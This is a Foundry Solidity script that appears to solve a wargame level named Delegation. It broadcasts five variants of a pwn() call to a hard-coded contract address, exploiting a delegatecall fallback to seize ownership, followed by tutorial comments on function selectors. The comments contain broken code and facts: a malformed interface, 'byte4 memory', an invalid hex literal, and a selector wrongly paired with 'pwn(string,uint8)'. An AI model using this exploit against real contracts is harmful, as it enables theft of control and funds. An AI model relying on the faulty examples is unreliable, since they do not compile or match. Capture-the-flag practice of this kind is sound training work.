// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Delegation,Delegate} from "../../src/07_Delegation/Delegation.sol";
import "forge-std/console.sol";
interface IPwn {function pwn() external;}


contract CounterScript is Script {
    function setUp() public {}

    function run() public 
    {
        Delegation i;
        i = Delegation(0x006b08570F288Df0810c48E0425D2a2e76cB745e);
        vm.startBroadcast();

        //1----->   Simple
        Delegate(address(i)).pwn();

        //2----->   Interface 
        IPwn(address(i)).pwn();

        //3----->   encodeWithSignature
        address(i).call(abi.encodeWithSignature("pwn()"));

        //4----->   encodeWithSelector       (Disadvantage - Need to Calculates selector seperately)
        address(i).call(abi.encodeWithSelector(bytes4(keccak256("pwn()"))));

        //5----->   if you already know func selector
        address(i).call(hex"dd365b8b");
        vm.stopBroadcast();
    }
}

/*


Function signature	   =     "pwn(string,uint8)"   =  Function name + parameter types.
Function selector      =     dd365b8b              =  First 4 bytes of the Keccak256(function signature)



- keccak256()                   →   Only Calculates the hash.                        It does NOT ABI-encode function arguments.
- abi.encodeWithSignature()     →   func signature   + encodes arguments.            (Recommended)
- abi.encodeWithSelector()      →   func selector    + encodes arguments.            Need to Calculates selector seperately




Examples

1. 
interface IPwn {function co external;}
IPwn(address(i)).pwn("hello", 10);


2. 
bytes memory data_           =    abi.encodeWithSignature("pwn(uint256,string)",123,"hello");


3.
byte4 memory selector_       =    bytes4(keccak256(pwn(uint256,string)))
bytes memory data_           =    abi.encodeWithSelector(selector_,123,"hello");


4.
address(i).call(hex"0x61ae9d9e");


*/